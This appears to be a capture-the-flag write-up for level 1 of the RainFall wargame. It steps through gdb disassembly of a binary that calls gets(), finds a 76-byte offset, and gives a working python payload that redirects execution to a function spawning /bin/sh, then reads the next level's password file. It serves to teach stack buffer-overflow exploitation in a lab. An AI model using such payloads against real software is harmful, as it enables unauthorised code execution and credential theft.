# Level 1


We have a new binary, lets read what's inside :



```
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  gets
0x08048340  gets@plt
0x08048350  fwrite
0x08048350  fwrite@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  run
0x08048480  main
0x080484a0  __libc_csu_init
0x08048510  __libc_csu_fini
0x08048512  __i686.get_pc_thunk.bx
0x08048520  __do_global_ctors_aux
0x0804854c  _fini
(gdb) 
```

We see there is some generic system function, but there is a main, and a run function.

```
Dump of assembler code for function main:
   0x08048480 <+0>:	push   %ebp
   0x08048481 <+1>:	mov    %esp,%ebp
   0x08048483 <+3>:	and    $0xfffffff0,%esp
   0x08048486 <+6>:	sub    $0x50,%esp
   0x08048489 <+9>:	lea    0x10(%esp),%eax
   0x0804848d <+13>:	mov    %eax,(%esp)
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave  
   0x08048496 <+22>:	ret    
End of assembler dump.
(gdb) 
```

The main consist of just doing a get() and nothing else so that's all the binary is doing.


```
Dump of assembler code for function run:
   0x08048444 <+0>:	push   %ebp
   0x08048445 <+1>:	mov    %esp,%ebp
   0x08048447 <+3>:	sub    $0x18,%esp
   0x0804844a <+6>:	mov    0x80497c0,%eax
   0x0804844f <+11>:	mov    %eax,%edx
   0x08048451 <+13>:	mov    $0x8048570,%eax
   0x08048456 <+18>:	mov    %edx,0xc(%esp)
   0x0804845a <+22>:	movl   $0x13,0x8(%esp)
   0x08048462 <+30>:	movl   $0x1,0x4(%esp)
   0x0804846a <+38>:	mov    %eax,(%esp)
   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:	movl   $0x8048584,(%esp)
   0x08048479 <+53>:	call   0x8048360 <system@plt>
   0x0804847e <+58>:	leave  
   0x0804847f <+59>:	ret    
End of assembler dump.
(gdb) 
```

Tho the run() function seems to be our door for the flag.

The gets() function vulnerable to Buffer overflow attacks, and since it is used by main, we are going to attack it.

Since the run might be our door for the flag, we are going to overwrite the EIP (Extented Instruction Pointer) of the main, so it points to the adress of the run function.

The program wil segfault when the EIP points to an adress it doesn't own, this will be our hint to know where the EIP is so we can overwrite it.


By giving an input of a lot of A

```
Continuing.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA


Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()

(gdb) info register
eax            0xbffff6f0	-1073744144
ecx            0xb7fd28c4	-1208145724
edx            0xbffff6f0	-1073744144
ebx            0xb7fd0ff4	-1208152076
esp            0xbffff740	0xbffff740
ebp            0x41414141	0x41414141
esi            0x0	0
edi            0x0	0
eip            0x41414141	0x41414141
eflags         0x210282	[ SF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) 



```

We see our EIP got overwriten with 0x41 which the ascii of A.

So instead of re-running the debugger a lot of times by substracting A until we find the exact number of char needed to reach the EIP, we are going to use an offset tool pattern.

```
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x63413563 in ?? ()
(gdb) 

```

And by subsctrating the return adress with the user input we know the offset is 76.


So we know that the buffer is 76, and we need to write 76 A to reach the EIP and from here inject what we want.


The adress of the run function is the following, 
0x08048444, and we must give it in backward since the current processor use little-endian coding . (google).

```
level1@RainFall:~$ python -c "print 'A' * 76 + '\x44\x84\x04\x08'" | ./level1 
Good... Wait what?
Segmentation fault (core dumped)
level1@RainFall:~$ 

```

By giving this as input the binary show us a really good message, it worked ! Lets show in-depth what the run function does.


```gdb
Dump of assembler code for function run:
   0x08048444 <+0>:	push   %ebp
   0x08048445 <+1>:	mov    %esp,%ebp
   0x08048447 <+3>:	sub    $0x18,%esp
   0x0804844a <+6>:	mov    0x80497c0,%eax
   0x0804844f <+11>:	mov    %eax,%edx
   0x08048451 <+13>:	mov    $0x8048570,%eax
   0x08048456 <+18>:	mov    %edx,0xc(%esp)
   0x0804845a <+22>:	movl   $0x13,0x8(%esp)
   0x08048462 <+30>:	movl   $0x1,0x4(%esp)
   0x0804846a <+38>:	mov    %eax,(%esp)
   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:	movl   $0x8048584,(%esp)
   0x08048479 <+53>:	call   0x8048360 <system@plt>
   0x0804847e <+58>:	leave  
   0x0804847f <+59>:	ret    
End of assembler dump.
(gdb) x/s 0x8048570
0x8048570:	 "Good... Wait what?\n"
(gdb) x/s 0x8048584
0x8048584:	 "/bin/sh"
(gdb) 
```

It print "Good... Wait what?" and then execute the system syscall with "/bin/sh"

So it should be executing a shell so that we can go to the next level, but it crashed, we need to keep an input on the binary.


```
level1@RainFall:~$ (python -c "print 'A' * 76 + '\x44\x84\x04\x08'" ; cat) | ./level1 
Good... Wait what?
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

We print give the injection input to the binary while and then execute a cat to still have an input on it, so that after the "/bin/sh" call we can still write to the binary and cat our flag.